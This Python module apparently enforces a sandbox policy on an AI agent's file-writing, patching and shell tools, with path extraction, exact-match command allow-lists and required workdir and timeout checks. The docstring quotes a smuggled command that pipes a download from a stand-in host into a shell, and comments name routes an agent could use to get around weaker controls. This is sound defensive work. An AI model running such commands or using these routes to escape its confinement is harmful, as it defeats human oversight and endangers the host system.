#!/usr/bin/env python3
"""Diana M4: per-tool argument, path and command policy (spec: HERMES-RUNTIME-M4.md).

M1 proved a **name** set is enough to bound two read tools. M4 grants `write_file`,
`patch` and `terminal`, and a name set stops being enough the moment a tool's
*arguments* decide its blast radius. This module is that richer policy, consulted
at the same dispatch boundary M1 proved -- the boundary is not replaced (M4-D1).

## Two controls, for two different reasons

**Files.** M1's `_resolve_path_for_task` confinement already refuses every
out-of-scope write, including every V4A patch header, with no modification --
verified behaviorally (M4 F4). So why add anything? Because that resolver cannot
tell a read from a write. M4 needs `write_scope` to be *narrower* than
`read_scope`, and only a control that knows the tool name can do that.

**Shell.** `terminal` never reaches that resolver at all. A shell command writes
outside the scope, reads outside it, and accepts an arbitrary `workdir` (M4 F5).
There is no boundary there to narrow; there is one to create.

## Why the path extractor is the interesting part

`patch` has two modes and the second one carries its **own** paths. `mode="patch"`
takes patch content only -- no `path` argument exists -- and its V4A headers name
`Update` / `Add` / `Delete` targets, while `Move File:` names **two**. A policy
that read `args["path"]` would be bypassed by one call (M4 F2). Hermes's own V4A
guard rejects `..` but explicitly permits absolute paths and calls header paths
"more attacker-influenceable than path=" (M4 F3), so it is a traversal check, not
a containment boundary.

Consequently the extractor returns a set and an **interpretability flag**. If it
cannot determine the full set a call would touch, the call is refused (M4-D8):
Diana must never permit a mutation whose blast radius it could not compute.

## Why commands are exact-match and nothing else

M1 D10 deleted the command-parsing game as unwinnable, and M4 does not reopen it.
A command is permitted iff it is **byte-identical** to a declared member. No
prefixes -- `"npm test"` as a prefix rule admits `"npm test; curl evil | sh"`. No
globs, no metacharacter analysis, no classification. This is the same mechanism
`allowed_tools` already uses, and it is checkable rather than arguable.

The cost is real and stated rather than hidden: Hermes cannot invent commands.
Diana declares what a run may execute. That is the authority split M4 exists for.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "runtime"))
import read_scope as _read_scope  # noqa: E402

# Tools whose arguments this policy understands. A granted tool absent from here
# is refused by `decide`, so widening `allowed_tools` without teaching the policy
# fails closed rather than silently granting unexamined authority.
WRITE_TOOLS = frozenset({"write_file", "patch"})
COMMAND_TOOLS = frozenset({"terminal"})
READ_TOOLS = frozenset({"read_file", "search_files"})
KNOWN_TOOLS = WRITE_TOOLS | COMMAND_TOOLS | READ_TOOLS

# Mirrors tools/file_tools.py:149-150 at the pinned commit. Kept deliberately
# lenient in the same places Hermes is lenient (`\s*` after `***`), because a
# stricter regex here would miss a header Hermes would still honour.
_V4A_SINGLE_HEADER = re.compile(r"^(?:\*\*\*\s*(Update|Add|Delete)\s+File:\s*)(.+)$", re.MULTILINE)
_V4A_MOVE_HEADER = re.compile(r"^(?:\*\*\*\s*Move\s+File:\s*)(.+?)\s*->\s*(.+)$", re.MULTILINE)

DEFAULT_MAX_TIMEOUT_S = 300


class Verdict:
    """An allow/deny decision plus the reason an operator will actually read."""

    __slots__ = ("allowed", "reason")

    def __init__(self, allowed: bool, reason: str = "") -> None:
        self.allowed = allowed
        self.reason = reason

    def __bool__(self) -> bool:
        return self.allowed

    def __repr__(self) -> str:
        return f"Verdict({'allow' if self.allowed else 'deny'}, {self.reason!r})"


ALLOW = Verdict(True, "")


# --- path extraction (M4-D7, M4-D8) ---------------------------------------

def extract_paths(tool_name: str, args: object) -> tuple[set[str], str | None]:
    """Return (paths, uninterpretable_reason).

    A non-None reason means the blast radius could not be computed, and the
    caller must refuse. Returning an empty set with no reason means the call
    genuinely touches no path.
    """
    if not isinstance(args, dict):
        return set(), f"{tool_name} arguments are not an object"

    if tool_name == "write_file":
        path = args.get("path")
        if not isinstance(path, str) or not path:
            return set(), "write_file.path is missing or not a string"
        return {path}, None

    if tool_name == "patch":
        mode = args.get("mode", "replace")
        if not isinstance(mode, str):
            return set(), "patch.mode is not a string"
        if mode == "replace":
            path = args.get("path")
            if not isinstance(path, str) or not path:
                return set(), "patch replace-mode requires a string path"
            return {path}, None
        if mode == "patch":
            body = args.get("patch")
            if not isinstance(body, str) or not body.strip():
                return set(), "patch V4A mode requires a non-empty patch body"
            paths = {m.group(2).strip() for m in _V4A_SINGLE_HEADER.finditer(body)}
            for match in _V4A_MOVE_HEADER.finditer(body):
                # Move names a source AND a destination; both are touched.
                paths.add(match.group(1).strip())
                paths.add(match.group(2).strip())
            if not paths:
                # A body Hermes might still act on, whose targets we could not
                # read. Refusing is the only honest answer.
                return set(), "patch V4A body named no interpretable file header"
            if any(not p for p in paths):
                return set(), "patch V4A body contained an empty file header"
            # `patch_tool` runs `_paths_to_check = [path] if path else []`
            # BEFORE it branches on mode, so a V4A call that also carries
            # `path` makes Hermes resolve that path too. M4-D7 is literal --
            # every path a call could touch, not just the ones the mode's
            # documented shape implies -- so it is extracted here rather than
            # trusted to be inert.
            also = args.get("path")
            if also is not None:
                if not isinstance(also, str) or not also:
                    return set(), "patch V4A mode carried a non-string path argument"
                paths.add(also)
            return paths, None
        # An unknown mode is a future Hermes behavior this policy has not been
        # taught. Fail closed rather than guess which arguments carry paths.
        return set(), f"patch.mode {mode!r} is not an interpretable mode"

    if tool_name in READ_TOOLS:
        return set(), None

    return set(), f"{tool_name} has no path extractor"


# --- write policy (M4-D6) --------------------------------------------------

def decide_write(tool_name: str, args: object, write_scope: dict) -> Verdict:
    """Refuse unless EVERY path the call could touch is inside `write_scope`."""
    paths, problem = extract_paths(tool_name, args)
    if problem is not None:
        return Verdict(False, f"argument shape not interpretable: {problem}")
    for path in sorted(paths):
        allowed, why = _read_scope.decide(path, write_scope)
        if not allowed:
            # Named rather than summarised: an operator needs to know which
            # path failed, not merely that one did.
            return Verdict(False, f"path outside write_scope: {path!r} ({why})")
    return ALLOW


# --- command policy (M4-D9, M4-D10, M4-D11) -------------------------------

def decide_command(args: object, allowed_commands, command_policy: dict | None = None) -> Verdict:
    """Refuse unless `command` is byte-identical to a declared member.

    No parsing, by design. Every other argument that can change what runs or for
    how long is checked too, because a permitted command with an unbounded
    lifetime or an arbitrary working directory is not a bounded command.
    """
    policy = command_policy or {}
    if not isinstance(args, dict):
        return Verdict(False, "terminal arguments are not an object")

    command = args.get("command")
    if not isinstance(command, str):
        return Verdict(False, "terminal.command is missing or not a string")
    if command not in set(allowed_commands or ()):
        return Verdict(False, f"command is not in allowed_commands: {command!r}")

    # M4-D10: a backgrounded process outlives the tool call, so a bound on the
    # call is not a bound on the work. Durable long-running work is M5's subject.
    if args.get("background"):
        return Verdict(False, "background execution is not permitted in this envelope")
    if args.get("pty"):
        return Verdict(False, "pty execution is not permitted in this envelope")
    if args.get("notify"):
        return Verdict(False, "notification callbacks are not permitted in this envelope")

    # M4-D11 as corrected by ERRATA-002 (audit finding F-A7). `workdir` used to
    # be optional, on the stated reasoning that "an absent workdir is safe to
    # default because the session cwd is still scope-checked". That reasoning was
    # false: NOTHING scope-checks the session cwd. The result was an asymmetry in
    # which naming a directory got it refused while omitting the argument ran the
    # command in that same directory -- F-A2's shape, one argument over.
    #
    # The ambient process/session cwd is not part of the approved
    # ExecutionContract and is not a durable authority binding: it is inherited
    # from whatever process happens to be running and does not survive a restart
    # or a resume. Diana must never infer permission from it. So `workdir` is
    # REQUIRED and omission fails closed -- the declared roots are the only
    # channel by which a working directory can be authorized.
    workdir = args.get("workdir")
    if workdir is None:
        return Verdict(False, "terminal.workdir must be declared explicitly; "
                              "the ambient session cwd is not an authority channel")
    if not isinstance(workdir, str) or not workdir:
        return Verdict(False, "terminal.workdir is not a non-empty string")
    roots = policy.get("workdir_roots")
    if not roots:
        return Verdict(False, "terminal.workdir supplied but no workdir_roots are declared")
    # `decide` canonicalizes before containment (spec C2) and denies on any
    # resolution failure, so traversal and symlink escape are covered here.
    allowed, why = _read_scope.decide(workdir, {"allowed_roots": list(roots), "denied_subpaths": []})
    if not allowed:
        return Verdict(False, f"workdir outside declared roots: {workdir!r} ({why})")

    timeout = args.get("timeout")
    ceiling = policy.get("max_timeout_s", DEFAULT_MAX_TIMEOUT_S)
    if timeout is None:
        # Hermes computes `effective_timeout = timeout or config["timeout"]`,
        # and that config default is TERMINAL_TIMEOUT=180s -- derived from
        # Hermes's environment, not from anything Diana declared. So omitting
        # the argument does not mean "the declared ceiling"; it means "Hermes's
        # bound instead of ours", which is exactly the quiet divergence M4-D11
        # refuses to allow. `workdir` is refused on omission for the same reason
        # (ERRATA-002 / F-A7); the claim that once stood here -- that an absent
        # workdir was safe because the session cwd is scope-checked -- was false.
        return Verdict(False, f"terminal.timeout must be declared explicitly (ceiling {ceiling}s)")
    if not isinstance(timeout, int) or isinstance(timeout, bool) or timeout < 1:
        return Verdict(False, "terminal.timeout is not a positive integer")
    if timeout > ceiling:
        # Refused rather than clamped: a run whose bound is quietly
        # different from the one requested is a run nobody can reason about.
        return Verdict(False, f"timeout {timeout}s exceeds the declared ceiling {ceiling}s")
    return ALLOW


# --- the policy object installed at the dispatch boundary -----------------

class MutationPolicy:
    """Per-tool argument policy built from an `ExecutionContract` envelope.

    Deliberately constructed from the envelope alone. It has no access to the
    task, the model, or anything Hermes said -- the same discipline that keeps
    `risk` a function of capability rather than of intent (M1 D12).
    """

    def __init__(self, envelope: dict) -> None:
        self.allowed_tools = frozenset(envelope.get("allowed_tools") or ())
        self.write_scope = envelope.get("write_scope")
        self.allowed_commands = tuple(envelope.get("allowed_commands") or ())
        self.command_policy = envelope.get("command_policy") or {}

    def decide(self, tool_name: str, args: object) -> Verdict:
        """Argument-level verdict. Name-level membership is checked separately."""
        if tool_name in READ_TOOLS:
            # Read confinement is M1's, enforced at `_resolve_path_for_task`,
            # and M4 does not duplicate it here. Duplicating it would create a
            # second place for the two to disagree.
            return ALLOW
        if tool_name in WRITE_TOOLS:
            if not isinstance(self.write_scope, dict):
                return Verdict(False, f"{tool_name} granted but no write_scope is declared")
            return decide_write(tool_name, args, self.write_scope)
        if tool_name in COMMAND_TOOLS:
            if not self.allowed_commands:
                return Verdict(False, "terminal granted but no allowed_commands are declared")
            return decide_command(args, self.allowed_commands, self.command_policy)
        # A tool granted by name that this policy does not understand. Refuse:
        # an unexamined argument surface is unexamined authority (M4-D8).
        return Verdict(False, f"no argument policy is defined for {tool_name!r}")
